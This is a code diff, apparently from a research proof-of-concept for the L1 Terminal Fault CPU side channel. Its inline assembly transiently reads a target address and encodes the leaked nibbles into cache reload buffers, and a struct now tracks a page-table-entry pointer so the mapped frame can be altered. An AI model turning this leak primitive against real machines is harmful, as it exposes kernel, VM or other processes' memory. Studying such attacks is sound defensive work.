@@ -23,29 +23,30 @@ typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
 #define AMOUNT_OF_BYTE_OPTIONS 256
 typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];
 
-extern uint64_t reload_label_nibbles(void);
 static inline __attribute__((always_inline)) void
 asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "xor %%rbx, %%rbx\n"
+               "movl $0xB1ABE849, %%r12d\n"
+               "movl $0xCD7E16F1, %%r13d\n"
+               "leaq handler%=(%%rip), %%r14\n"
                "movq (%[leak_addr]), %%rax\n"
                "movq %%rax, %%rbx\n"
                "and $0xf0, %%rax\n"
                "and $0x0f, %%rbx\n"
                "shl $0x8, %%rax\n"
                "shl $0xc, %%rbx\n"
-               "movq (%[nibble0], %%rbx, 1), %%r8\n"
-               "movq (%[nibble1], %%rax, 1), %%r8\n"
-               /* "mfence\n" */
-               /* "asm_l1tf_leak_nibbles_loop:\n" */
-               /* "pause\n" */
-               /* "jmp asm_l1tf_leak_nibbles_loop\n" */
-               ".global reload_label_nibbles\n"
-               "reload_label_nibbles:"
+               "movq (%[nibble0], %%rbx, 1), %%r12\n"
+               "movq (%[nibble1], %%rax, 1), %%r12\n"
+               "mfence\n"
+               "inf_loop%=:\n"
+               "  pause\n"
+               "  jmp inf_loop%=\n"
+               "handler%=:"
 
                ::[leak_addr] "r"(leak_addr),
                [nibble0] "r"(reload_buffer[0]), [nibble1] "r"(reload_buffer[1])
-               : "rax", "rbx", "r8");
+               : "rax", "rbx", "r12", "r13", "r14");
 }
 
 extern uint64_t reload_label_full(void);
@@ -73,9 +74,13 @@ asm_l1tf_leak_full(void *leak_addr, full_reload_buffer_t reload_buffer) {
 uint8_t reconstruct_nibbles(size_t raw_results[AMOUNT_OF_RELOAD_PAGES]);
 
 typedef struct {
+  // The virtual address that will be passed to the l1tf leaking code
   void *leak;
+  // The original pfn before we started to modify it
   size_t original_pfn;
-  size_t current_pfn;
+  // A pointer to PTE of the virtual address in the the
+  // physical-memory-to-userspace mapping
+  size_t *pte_ptr;
 } leak_addr_t;
 
 leak_addr_t l1tf_leak_buffer_create();
